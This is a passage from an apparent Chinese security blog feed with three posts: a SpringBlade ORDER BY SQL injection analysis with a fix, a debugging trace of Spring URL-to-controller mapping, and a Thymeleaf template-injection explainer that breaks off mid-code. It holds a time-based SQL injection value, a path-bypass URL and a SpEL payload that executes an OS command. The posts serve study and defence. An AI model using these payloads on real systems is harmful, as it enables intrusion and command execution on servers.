<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//LogApiController.java</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/list"</span>)</span><br><span class="line"><span class="keyword">public</span> R&lt;IPage&lt;LogApiVo&gt;&gt; list(<span class="meta">@ApiIgnore</span> <span class="meta">@RequestParam</span> Map&lt;String, Object&gt; log, Query query) &#123;</span><br><span class="line">	IPage&lt;LogApi&gt; pages = logService.page(Condition.getPage(query.setDescs(<span class="string">"create_time"</span>)), Condition.getQueryWrapper(log, LogApi<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">	List&lt;LogApiVo&gt; records = pages.getRecords().stream().map(logApi -&gt; &#123;</span><br><span class="line">		LogApiVo vo = BeanUtil.copy(logApi, LogApiVo<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">		vo.setStrId(Func.toStr(logApi.getId()));</span><br><span class="line">		<span class="keyword">return</span> vo;</span><br><span class="line">	&#125;).collect(Collectors.toList());</span><br><span class="line">	IPage&lt;LogApiVo&gt; pageVo = <span class="keyword">new</span> Page&lt;&gt;(pages.getCurrent(), pages.getSize(), pages.getTotal());</span><br><span class="line">	pageVo.setRecords(records);</span><br><span class="line">	<span class="keyword">return</span> R.data(pageVo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数<code>page</code>来自<code>Condition.getPage()</code></p>
<p>参数<code>queryWrapper</code>来自<code>Condition.getQueryWrapper()</code></p>
<p>我们再来看<a href="https://github.com/chillzhuang/blade-tool/blob/master/blade-core-mybatis/src/main/java/org/springblade/core/mp/support/Condition.java" target="_blank" rel="noopener">Condition</a>的源码，<code>page</code>是一个Mybatis Plus中的<a href="https://github.com/baomidou/mybatis-plus/blob/3.0/mybatis-plus-extension/src/main/java/com/baomidou/mybatisplus/extension/plugins/pagination/Page.java" target="_blank" rel="noopener">Page</a>类，赋值了传入<code>Query</code>中的四个值（<code>current</code>、<code>size</code>、<code>ascs</code>、<code>descs</code>），<code>Wrapper</code>是一个条件构造器，<code>QueryWrapper</code>则继承自<code>Wrapper</code>，用于构造查询条件。可以把<code>Wrapper</code>理解为SQL的包装器，<code>page</code>则是可插入<code>Wrapper</code>中的数据，如当前页数、排序方式等。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 转化成mybatis plus中的Page</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> query 查询条件</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> IPage</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">IPage&lt;T&gt; <span class="title">getPage</span><span class="params">(Query query)</span> </span>&#123;</span><br><span class="line">	Page&lt;T&gt; page = <span class="keyword">new</span> Page&lt;&gt;(Func.toInt(query.getCurrent(), <span class="number">1</span>), Func.toInt(query.getSize(), <span class="number">10</span>));</span><br><span class="line">	page.setAsc(Func.toStrArray(SqlKeyword.filter(query.getAscs())));</span><br><span class="line">	page.setDesc(Func.toStrArray(SqlKeyword.filter(query.getDescs())));</span><br><span class="line">	<span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 获取mybatis plus中的QueryWrapper</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> query 查询条件</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> clazz 实体类</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> &lt;T&gt;   类型</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> QueryWrapper</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">QueryWrapper&lt;T&gt; <span class="title">getQueryWrapper</span><span class="params">(Map&lt;String, Object&gt; query, Class&lt;T&gt; clazz)</span> </span>&#123;</span><br><span class="line">	Kv exclude = Kv.init().set(TokenConstant.HEADER, TokenConstant.HEADER)</span><br><span class="line">		.set(<span class="string">"current"</span>, <span class="string">"current"</span>).set(<span class="string">"size"</span>, <span class="string">"size"</span>).set(<span class="string">"ascs"</span>, <span class="string">"ascs"</span>).set(<span class="string">"descs"</span>, <span class="string">"descs"</span>);</span><br><span class="line">	<span class="keyword">return</span> getQueryWrapper(query, exclude, clazz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 获取mybatis plus中的QueryWrapper</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> query   查询条件</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> exclude 排除的查询条件</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> clazz   实体类</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> &lt;T&gt;     类型</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> QueryWrapper</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">QueryWrapper&lt;T&gt; <span class="title">getQueryWrapper</span><span class="params">(Map&lt;String, Object&gt; query, Map&lt;String, Object&gt; exclude, Class&lt;T&gt; clazz)</span> </span>&#123;</span><br><span class="line">	exclude.forEach((k, v) -&gt; query.remove(k));</span><br><span class="line">	QueryWrapper&lt;T&gt; qw = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">	qw.setEntity(BeanUtil.newInstance(clazz));</span><br><span class="line">	SqlKeyword.buildCondition(query, qw);</span><br><span class="line">	<span class="keyword">return</span> qw;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>知道了数据的传入，还有有一点需要弄明白，SQL语句的内容是从哪来的？</p>
<p>很多人可能默认会想是根据<code>LogApiMapper.xml</code>中获取的，但其实并不是。其中的查询语句只有select部分，缺少from等元素，并且mysql日志的语句和下面语句中查询参数的顺序不一致。实际上SQL语句的构造并没有利用到Mapper配置中的该<code>&lt;sql&gt;</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 通用查询结果列 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">"baseColumnList"</span>&gt;</span></span><br><span class="line">		select id,</span><br><span class="line">		create_time AS createTime,</span><br><span class="line">		service_id, server_host, server_ip, env, type, title, method, request_uri, user_agent, remote_ip, method_class, method_name, params, time, create_by</span><br><span class="line"><span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br></pre></td></tr></table></figure>





<p>我们先来看看<code>IService</code>的声明，使用了<code>&lt;T&gt;</code>泛型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IService</span>&lt;<span class="title">T</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>ILogApiService</code>继承<code>IService</code>时制定了<code>&lt;LogApi&gt;</code>作为数据类型，其实SQL语句的内容就是通过这个<code>LogApi</code>来构造的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ILogApiService</span> <span class="keyword">extends</span> <span class="title">IService</span>&lt;<span class="title">LogApi</span>&gt;</span></span><br></pre></td></tr></table></figure>





<p>来看<a href="https://github.com/chillzhuang/blade-tool/blob/master/blade-core-log/src/main/java/org/springblade/core/log/model/LogApi.java" target="_blank" rel="noopener">LogApi</a>的源码，里面定义了一些数据类型，继承<code>LogAbstract</code>，在注解<code>@TableName</code>中声明了数据库。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName</span>(<span class="string">"blade_log_api"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogApi</span> <span class="keyword">extends</span> <span class="title">LogAbstract</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">	<span class="keyword">private</span> String type;  <span class="comment">// 日志类型</span></span><br><span class="line">	<span class="keyword">private</span> String title;  <span class="comment">// 日志标题</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>LogApi又继承自<a href="https://github.com/chillzhuang/blade-tool/blob/master/blade-core-log/src/main/java/org/springblade/core/log/model/LogAbstract.java" target="_blank" rel="noopener">LogAbstract</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogAbstract</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@TableId</span>(value = <span class="string">"id"</span>, type = IdType.ID_WORKER)</span><br><span class="line">	<span class="keyword">protected</span> Long id;  <span class="comment">// 主键id</span></span><br><span class="line">	<span class="keyword">protected</span> String serviceId;  <span class="comment">// 服务ID</span></span><br><span class="line">	<span class="keyword">protected</span> String serverIp;  <span class="comment">// 服务器 ip</span></span><br><span class="line">	<span class="keyword">protected</span> String serverHost;  <span class="comment">// 服务器名</span></span><br><span class="line">	<span class="keyword">protected</span> String env;  <span class="comment">// 环境</span></span><br><span class="line">	<span class="keyword">protected</span> String remoteIp;  <span class="comment">// 操作IP地址</span></span><br><span class="line">	<span class="keyword">protected</span> String userAgent;  <span class="comment">//用户代理</span></span><br><span class="line">	<span class="keyword">protected</span> String requestUri;  <span class="comment">//请求URI</span></span><br><span class="line">	<span class="keyword">protected</span> String method;  <span class="comment">// 操作方式</span></span><br><span class="line">	<span class="keyword">protected</span> String methodClass;  <span class="comment">// 方法类</span></span><br><span class="line">	<span class="keyword">protected</span> String methodName;  <span class="comment">// 方法名</span></span><br><span class="line">	<span class="keyword">protected</span> String params;  <span class="comment">// 操作提交的数据</span></span><br><span class="line">	<span class="keyword">protected</span> String time;  <span class="comment">// 执行时间</span></span><br><span class="line">	<span class="keyword">protected</span> String createBy;  <span class="comment">// 创建人</span></span><br><span class="line"></span><br><span class="line">	<span class="meta">@DateTimeFormat</span>(pattern = DateUtil.PATTERN_DATETIME)</span><br><span class="line">	<span class="meta">@JsonFormat</span>(pattern = DateUtil.PATTERN_DATETIME)</span><br><span class="line">	<span class="keyword">protected</span> Date createTime;  <span class="comment">// 创建时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到以上数据就能明白，SQL是如何构造出来的。<code>select</code>部分是<code>LogApi</code>中的属性，<code>from</code>部分是通过注解<code>@TableName</code>获取的。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">type</span>, title, service_id, server_ip, server_host, env, remote_ip, user_agent, request_uri, method, method_class, method_name, params, <span class="built_in">time</span>, create_by, create_time </span><br><span class="line"><span class="keyword">FROM</span> blade_log_api</span><br></pre></td></tr></table></figure>

<p>初步构造好SQL语句之后，通过<code>page</code>和<code>queryWrapper</code>获取到其他需要的值，构造出<code>order by</code>后的内容</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">ORDER BY ascs ASC, create_time DESC LIMIT current*size,size</span><br></pre></td></tr></table></figure>

<p>当<code>ascs</code>或<code>descs</code>中有逗号时，Mybatis Plus会以逗号为分隔符，分成多段，并在每段后面添加<code>ASC</code>。</p>
<p>比如传入<code>ascs=if(1=1,sleep(1),2)</code>时，构造出来的语句为<code>ORDER BY if(1=1 ASC, sleep(1) ASC, 2) ASC</code></p>
<p>所以在注入时不能使用逗号，否则会导致SQL语句出错。</p>
<br>

<p>除此之外，其他使用<code>Query</code>传入数据，进行<code>page</code>分页查询的功能，若未对<code>ascs</code>或<code>descs</code>覆盖用户传参，就存在同类型的SQL注入。</p>
<p>以下代码中用到了分页查询：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">blade-service&#x2F;blade-log&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;core&#x2F;log&#x2F;controller&#x2F;LogErrorController.java</span><br><span class="line">blade-service&#x2F;blade-log&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;core&#x2F;log&#x2F;controller&#x2F;LogUsualController.java</span><br><span class="line">blade-service&#x2F;blade-demo&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;example&#x2F;demo&#x2F;controller&#x2F;NoticeController.java</span><br><span class="line">blade-service&#x2F;blade-desk&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;desk&#x2F;controller&#x2F;NoticeController.java</span><br><span class="line">blade-service&#x2F;blade-system&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;system&#x2F;controller&#x2F;AuthClientController.java</span><br><span class="line">blade-service&#x2F;blade-system&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;system&#x2F;controller&#x2F;ParamController.java</span><br><span class="line">blade-service&#x2F;blade-system&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;system&#x2F;controller&#x2F;PostController.java</span><br><span class="line">blade-service&#x2F;blade-system&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;system&#x2F;controller&#x2F;RegionController.java</span><br><span class="line">blade-service&#x2F;blade-system&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;system&#x2F;controller&#x2F;TenantController.java</span><br><span class="line">blade-service&#x2F;blade-user&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;system&#x2F;user&#x2F;controller&#x2F;UserController.java</span><br><span class="line">blade-ops&#x2F;blade-develop&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;develop&#x2F;controller&#x2F;CodeController.java</span><br><span class="line">blade-ops&#x2F;blade-develop&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;develop&#x2F;controller&#x2F;DatasourceController.java</span><br></pre></td></tr></table></figure>





<h1 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h1><p>单点修复：当业务功能不需要<code>ascs</code>参数时，将<code>ascs</code>设置为空值，避免被用户传入。</p>
<p>⚠️：order by后面是无法进行预编译的，并且由于使用Mybatis Plus，若想自己独立修改SQL语义成本较大。控制<code>ascs</code>的值是一个非常简洁的解决办法。</p>
<p>若想要通用防护手段，需要将<code>SqlKeyword.filter()</code>的过滤方法加以改进。</p>
]]></content>
  </entry>
  <entry>
    <title>Spring中请求URL找到相应Controller的过程</title>
    <url>/2020/08/22/Spring_URL2Controller/</url>
    <content><![CDATA[<p>我把Spring请求URL找到相应Controller的过程调试了一遍，在此记录该过程，属于个人记录，其中很可能存在某些不细致甚至错误的地方，还请见谅。</p>
<p>代码版本为<code>spring-webmvc-5.2.5.RELEASE-sources.jar</code></p>
<a id="more"></a>

<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>分析入口：<code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code></p>
<p><img src="/2020/08/22/Spring_URL2Controller/doDispatch.png" alt="doDispatch"></p>
<p>跟进<code>getHandler</code></p>
<p><img src="/2020/08/22/Spring_URL2Controller/getHandler.png" alt="getHandler"></p>
<p>再跟进<code>mapping.getHandler</code>，它是一个<code>interface</code>，此处由<code>AbstractHandlerMapping</code>实现该方法</p>
<p><img src="/2020/08/22/Spring_URL2Controller/mapping.handler.png" alt="mapping.handler"></p>
<p>点击148行右侧的绿色图标，跳转到<code>AbstractHandlerMapping#getHandler</code></p>
<p><img src="/2020/08/22/Spring_URL2Controller/AbstractHandlerMapping.getHandler.png" alt="AbstractHandlerMapping.getHandler"></p>
<p>此处<code>getHandlerIngernal</code>是一个抽象方法，在<code>AbstractHandlerMethodMapping#getHandlerInternal</code>中实现了该抽象方法</p>
<p><img src="/2020/08/22/Spring_URL2Controller/getHandlerInternal.png" alt="getHandlerInternal"></p>
<h2 id="getLookupPathForRequest"><a href="#getLookupPathForRequest" class="headerlink" title="getLookupPathForRequest"></a>getLookupPathForRequest</h2><p>重点在此，<code>getUrlPathHelper().getLookupPathForRequest(request)</code>中从请求中获取代码中对应的path，可以在此下断点进行调试，详细了解Spring是怎么获取请求路径的。</p>
<p>传入<code>http://localhost/shiro/admin;////..;/manage/page/index</code>进行调试（如果此时传入正常的URL，则<code>getPathWithinServletMapping</code>方法会返回空字符串，再到<code>else</code>中的<code>getPathWithinAPPlication</code>方法）</p>
<p><img src="/2020/08/22/Spring_URL2Controller/getLookupPathForRequest.png" alt="getLookupPathForRequest"></p>
<p>跟进<code>getPathWithinServletMapping</code></p>
<p><img src="/2020/08/22/Spring_URL2Controller/getPathWithinServletMapping.png" alt="getPathWithinServletMapping"></p>
<h3 id="getPathWithinApplication"><a href="#getPathWithinApplication" class="headerlink" title="getPathWithinApplication"></a>getPathWithinApplication</h3><p>首先来看<code>getPathWithinApplication</code></p>
<p><img src="/2020/08/22/Spring_URL2Controller/getPathWithinApplication.png" alt="getPathWithinApplication"></p>
<p>其中<code>getContextPath</code>为获取Context path，不做重点分析，重点来看<code>getRequestUri</code></p>
<p><img src="/2020/08/22/Spring_URL2Controller/getRequestUri.png" alt="getRequestUri"></p>
<p><code>request.getRequestURI()</code>得到的是<code>/shiro/admin;////..;/manage/page/index</code>，继续跟进<code>decodeAndCleanUriString</code>方法</p>
<p><img src="/2020/08/22/Spring_URL2Controller/decodeAndCleanUriString.png" alt="decodeAndCleanUriString"></p>
<p><code>decodeAndCleanUriString</code>方法对<code>uri</code>进行了三种处理</p>
<p>(1) 移除两个<code>/</code>间，分号和分号后的内容，得到<code>/shiro/admin////../manage/page/index</code></p>
<p>（例如传入<code>/admin;random/page;jsessionid=1111</code>，会得到<code>/admin/page/</code>）</p>
<p><img src="/2020/08/22/Spring_URL2Controller/removeSemicolonContent.png" alt="removeSemicolonContent"></p>
<p>(2) URL解码（URL解码没什么好说的）</p>
<p>(3) 移除多余的<code>/</code></p>
<p><img src="/2020/08/22/Spring_URL2Controller/getSanitizedPath.png" alt="getSanitizedPath"></p>
<p>经过以上处理，最终得到的uri是<code>/shiro/admin/../manage/page/index</code></p>
<p>回到<code>getPathWithinApplication</code>方法，其中<code>getRemainingPath</code>方法将移除<code>requestUri</code>中和<code>contextPath</code>中相同的字段（在此是<code>/shiro</code>），得到<code>/admin/../manage/page/index</code></p>
<p><img src="/2020/08/22/Spring_URL2Controller/getPathWithinApplication2.png" alt="getPathWithinApplication2"></p>
<h3 id="getServletPath"><a href="#getServletPath" class="headerlink" title="getServletPath"></a>getServletPath</h3><p>也就是通过<code>request.getServletPath()</code>获取Servlet路径，得到<code>/manage/page/index</code></p>
<p><img src="/2020/08/22/Spring_URL2Controller/getServletPath.png" alt="getServletPath"></p>
<h3 id="getPathWithinApplication-2"><a href="#getPathWithinApplication-2" class="headerlink" title="getPathWithinApplication 2"></a>getPathWithinApplication 2</h3><p>经过以上代码，回到<code>getPathWithinApplication</code>。其中第218行<code>sanitizedPathWithinApp</code>变量，再次移除多余的<code>/</code>，uri在此无变化。</p>
<p>之后存在一个if判断，当<code>sanitizedPathWithinApp</code>不是<code>servletPath</code>的子集时，<code>path</code>等于<code>getRemainingPath(pathWithinApp, servletPath, false)</code></p>
<p><img src="/2020/08/22/Spring_URL2Controller/getPathWithinServletMapping2.png" alt="getPathWithinServletMapping2"></p>
<p>此时<code>getRequestURI</code>得到的<code>/admin/../manage/page/index</code>和<code>getServletPath</code>获取到的<code>/manage/page/index</code>开头无法匹配，经过<code>getRemainingPath</code>得到的path为<code>null</code>。</p>
<p><img src="/2020/08/22/Spring_URL2Controller/getPathWithinServletMapping3.png" alt="getPathWithinServletMapping3"></p>
<p>经过以上代码处理，最终返回的是<code>servletPath</code>，也就是返回<code>/manage/page/index</code>。</p>
<p>这里多说一下，通过<code>getReqeustURI</code>和<code>getServletPath</code>进行对比，当两者不同时，尝试<code>getPathInfo</code>。若<code>PathInfo</code>为空，最后返回<code>SerletPath</code>。通过这几个if判断，确保能正确获取请求路径（因为<code>getReqeustURI</code>得到的结果不可信，利用各种URL兼容性难以通过URI判断实际请求路径）。</p>
<h2 id="lookupHandlerMethod"><a href="#lookupHandlerMethod" class="headerlink" title="lookupHandlerMethod"></a>lookupHandlerMethod</h2><p>得到请求的资源路径之后，回到<code>AbstractHandlerMethodMapping#getHandlerInternal</code>，调用<code>lookupHandlerMethod</code>方法</p>
<p><img src="/2020/08/22/Spring_URL2Controller/getHandlerInternal2.png" alt="getHandlerInternal2"></p>
<p>看该方法的描述，进行最合适的匹配。</p>
<blockquote>
<p>Look up the best-matching handler method for the current request.<br>If multiple matches are found, the best match is selected.</p>
</blockquote>
<p><img src="/2020/08/22/Spring_URL2Controller/lookupHandlerMethod.png" alt="lookupHandlerMethod"></p>
<p>它定义了一个<code>matchs</code>的列表，然后内存变量<code>mappingRegistry</code>根据<code>lookupPath</code>获取所有的匹配对象。</p>
<p>如果存在这个匹配对象，那么回调用<code>addMatchingMappings</code>方法将匹配的对象映射到<code>matches</code>上。</p>
<p>如果未匹配到这个<code>lookupPath</code>，那么则会循环<code>mappingRegistry</code>中每个Mapping来匹配该路劲（因为RequestMapping中定义的路劲可以有通配符）。</p>
<p><img src="/2020/08/22/Spring_URL2Controller/mappingRegistry.png" alt="mappingRegistry"></p>
<p>至于<code>if(!matches.isEmpty())</code>内的代码，只是看看有没有一个请求映射到多个处理方法，如果存在并且优先级还一样，那么就会报错：Ambiguous handler methods mapped for HTTP path。</p>
<p>来看<code>addMatchingMappings</code>的代码</p>
<p><img src="/2020/08/22/Spring_URL2Controller/addMatchingMappings.png" alt="addMatchingMappings"></p>
<p>注意到<code>AbstractHandlerMethodMapping</code>这个class是个泛型抽象类 <code>getMatchingMapping</code>是个抽象方法，返回值为定义的泛型(T)，我们暂且把这个泛型成为[映射信息]。</p>
<p>根据方法名称，<code>T getMatchingMapping(T,reqeust)</code>，根据映射信息和请求获取是否匹配，如果匹配则返回映射信息。</p>
<p><code>RequestMappingInfoHandlerMapping</code>这个class继承了这个抽象类,泛型类型为：<code>RequestMappingInfo</code>。看看它的方法实现</p>
<p><img src="/2020/08/22/Spring_URL2Controller/getMatchingCondition.png" alt="getMatchingCondition"></p>
<p>如果其中<code>methods</code>、<code>params</code>、<code>headers</code>、<code>consumes</code>、<code>produces</code>、<code>patterns</code>、<code>custom</code>都匹配，那么可以说这个[映射信息]就匹配成功了。如果未匹配成功，则返回404。</p>
<ol>
<li><p>methods : 请求方法匹配（POST/GET/DELETE/PUT等等)，对应RequestMapping注解的method</p>
</li>
<li><p>params : 请求参数匹配 例如myParam=myValue，对应RequestMapping注解的params</p>
</li>
<li><p>headers : 请求头信息(例如：User-Agent: Mozilla/5.0），对应RequestMapping的headers</p>
</li>
<li><p>consumes : 提交内容类型(例如:application/json, text/html;)，对应RequestMapping的consumes</p>
</li>
<li><p>produces : 返回的内容类型(例如:application/json)，对应RequestMapping的consumes</p>
</li>
<li><p>patterns : URL格式(例如:test/testDo)，对应RequestMapping的value</p>
</li>
<li><p>自定义条件</p>
</li>
</ol>
<p>根据以上匹配得到的信息，就能找到对应的Controller。</p>
<p><code>org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler</code></p>
<p><img src="/2020/08/22/Spring_URL2Controller/HandlerExecutionChain.png" alt="HandlerExecutionChain"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Spring中获取请求路径的过程，在<code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping</code>中，其流程大概如下图所示。</p>
<p><img src="/2020/08/22/Spring_URL2Controller/diagram.png" alt="diagram"></p>
<p>其中比较关键的点是<code>getPathWithinApplication</code>方法，其中对RequestURI的处理有：删除冒号及冒号后的内容，URL解码，去除重复斜杠<code>/</code>（注意是先删除冒号，再URL解码）。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/hl233211/article/details/77450697" target="_blank" rel="noopener">https://blog.csdn.net/hl233211/article/details/77450697</a></p>
]]></content>
  </entry>
  <entry>
    <title>Spring Thymeleaf模版注入</title>
    <url>/2020/09/05/Spring_Thymeleaf_View_%20Manipulation/</url>
    <content><![CDATA[<h2 id="Thymeleaf介绍"><a href="#Thymeleaf介绍" class="headerlink" title="Thymeleaf介绍"></a>Thymeleaf介绍</h2><p> Thymeleaf 是一个跟 Velocity、FreeMarker 类似的模板引擎，它可以完全替代 JSP 。相较与其他的模板引擎，它有如下三个极吸引人的特点：</p>
<ol>
<li><p>Thymeleaf 在有网络和无网络的环境下皆可运行，即它可以让美工在浏览器查看页面的静态效果，也可以让程序员在服务器查看带数据的动态页面效果。这是由于它支持 html 原型，然后在 html 标签里增加额外的属性来达到模板+数据的展示方式。浏览器解释 html 时会忽略未定义的标签属性，所以 thymeleaf 的模板可以静态地运行；当有数据返回到页面时，Thymeleaf 标签会动态地替换掉静态内容，使页面动态显示。</p>
</li>
<li><p>Thymeleaf 开箱即用的特性。它提供标准和spring标准两种方言，可以直接套用模板实现JSTL、 OGNL表达式效果，避免每天套模板、改jstl、改标签的困扰。同时开发人员也可以扩展和创建自定义的方言。</p>
</li>
<li><p>Thymeleaf 提供spring标准方言和一个与 SpringMVC 完美集成的可选模块，可以快速的实现表单绑定、属性编辑器、国际化等功能。</p>
</li>
</ol>
<a id="more"></a>

<h2 id="Thymeleaf模版注入"><a href="#Thymeleaf模版注入" class="headerlink" title="Thymeleaf模版注入"></a>Thymeleaf模版注入</h2><p><a href="https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java" target="_blank" rel="noopener">Spring ThymeleafView</a>会使用表达式解析模版名称，若是将用户输入的参数拼接到模版路径中，可以造成表达式注入。</p>
<p>以下是漏洞案例代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/path"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">path</span><span class="params">(@RequestParam String lang)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"user/"</span> + lang + <span class="string">"/welcome"</span>; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/fragment"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">fragment</span><span class="params">(@RequestParam String section)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"welcome :: "</span> + section; <span class="comment">//fragment is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<p>漏洞复现：</p>
<p><img src="/2020/09/05/Spring_Thymeleaf_View_%20Manipulation/path-request.png" alt="path-request"></p>
<br>

<p>先来看payload: <code>__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()}__::.x</code></p>
<p>其中new了一个<code>java.util.Scanner</code>对象，用于读取字符。传入Scanner中的参数为<code>T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()</code>。</p>
<p><code>T( )</code>用于访问类作用域的方法和常量，具体可见<a href="http://itmyhome.com/spring/expressions.html#expressions-types" target="_blank" rel="noopener">这里</a></p>
<blockquote>
<p><code>java.util.Scanner</code>是可以省略的，它在此仅用于回显，无需回显时直接<code>T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;)</code>执行命令即可。</p>
</blockquote>
<p><code>::</code>在此为必须，不然不会进入表达式解析过程，并且一定得在表达式后面。</p>
<p><code>.x</code>在此处可忽略（<code>return &quot;user/&quot; + lang + &quot;/welcome&quot;;</code>）</p>
<br>

<p>解析路径的代码在<a href="https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java#L277" target="_blank" rel="noopener">ThymeleafView:277</a>，其中<code>viewTemplateName</code>中一定要包含<code>::</code>，不然不会进入表达式解析过程。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!viewTemplateName.contains(<span class="string">"::"</span>)) &#123;</span><br><span class="line">    <span class="comment">// No fragment specified at the template name</span></span><br><span class="line"></span><br><span class="line">    templateName = viewTemplateName;</span><br><span class="line">    markupSelectors = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Template name contains a fragment name, so we should parse it as such</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> IStandardExpressionParser parser = StandardExpressions.getExpressionParser(configuration);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> FragmentExpression fragmentExpression;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// By parsing it as a standard expression, we might 